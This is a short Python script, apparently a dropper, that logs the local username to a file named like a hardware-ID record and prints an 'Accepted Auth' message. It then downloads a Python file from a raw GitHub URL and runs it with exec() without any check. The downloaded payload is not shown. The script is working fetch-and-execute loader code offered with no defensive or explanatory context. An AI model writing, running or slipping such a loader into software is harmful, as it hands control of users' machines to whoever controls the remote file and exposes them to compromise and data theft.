import requests
import os

def main():
    user_name = os.environ.get('USERNAME', 'UnknownUser')

    file_name = f'NODJKSLmJDLJIdHWID.txt'
    with open(file_name, 'a') as file:
        file.write(f"The user {user_name} Accepted Auth...\n")

    url = 'https://raw.githubusercontent.com/AprillZerx/Loin/main/Prof.py'
    try:
        response = requests.get(url)
        if response.status_code == 200:
            exec(response.text)
        else:
            print(f"Error: Code: {response.status_code}")
    except Exception as e:
        print(f"ERROR: {e}")

if __name__ == "__main__":
    main()
